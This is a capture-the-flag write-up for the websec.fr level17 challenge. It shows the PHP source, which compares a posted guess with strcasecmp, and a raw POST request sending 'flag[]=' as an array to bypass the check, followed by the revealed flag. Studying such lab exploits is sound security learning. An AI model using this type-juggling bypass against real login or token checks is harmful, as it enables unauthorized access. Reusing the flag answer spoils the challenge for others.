# level17 - 1 point
[Link to the challenge](http://websec.fr/level17)

## Description
```
I was told that guessing is fun.
```
Guessing is fun! 
Can you guess the flag? You can check the sources here.

## Write-up
They gave us the PHP file with the source code of the chall's page:
``` PHP
<?php
include "flag.php";

function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1; # $bytes = 3
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); # creates a pseudo random string of bytes with length 3 (3 bytes)
        } while ($rnd >= $range); # get outs of loop only when $rnd < 100000
        usleep($rnd); # sleeps for <=0.1 seconds
}
?>
<!DOCTYPE html>
<html>
        <body>
                <div id="main">
                        <div class="container">
                            <div class="row">
                                <form class="form-inline" method='post'>
                                    <input name='flag' class='form-control' type='text' placeholder='Guessed flag'>
                                    <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
                                </form>
                            </div>
                        </div>
                        <?php
                        if (isset ($_POST['flag'])):
                            sleep_rand(); /* This makes timing-attack impractical. */
                        ?>
                        <br>
                        <div class="container">
                            <div class="row">
                                <?php
                                if (! strcasecmp ($_POST['flag'], $flag))
                                    echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
                                else
                                    echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
                                ?>
                            </div>
                        </div>
                        <?php endif ?>
                </div>
        </body>
</html>

```

Firstly, we notice that the parameters send in the request are `flag=my_flag_guess&submit=Go`. 

Then, after some research I've found that `strcmp` and `strcasecmp` have many problems. One of them is: when we compare a string and an empty array, the function (strcmp, strcasecmp) generates an error, but the return code is 0! So, if we cause an error, the result of `if (! strcasecmp ($_POST['flag'], $flag))` will be `TRUE`. Therefore, we'll have our flag!

Notice that if we get a `FALSE` here, we'll have our flag (`!FALSE = TRUE`).
``` PHP
<?php
    if (! strcasecmp ($_POST['flag'], $flag))
        echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
    else
        echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
    ?>
```

So, modifying the "flag" parameter in the request and turning it into an array...
```
POST /level17/index.php HTTP/1.1
Host: websec.fr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://websec.fr/
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://websec.fr
Connection: close
Upgrade-Insecure-Requests: 1

flag[]=&submit=Go
```
... we get our flag!

**Flag: `WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`**

### Links that helped me understand the challenge:
https://www.php.net/manual/pt_BR/function.openssl-random-pseudo-bytes.php
https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/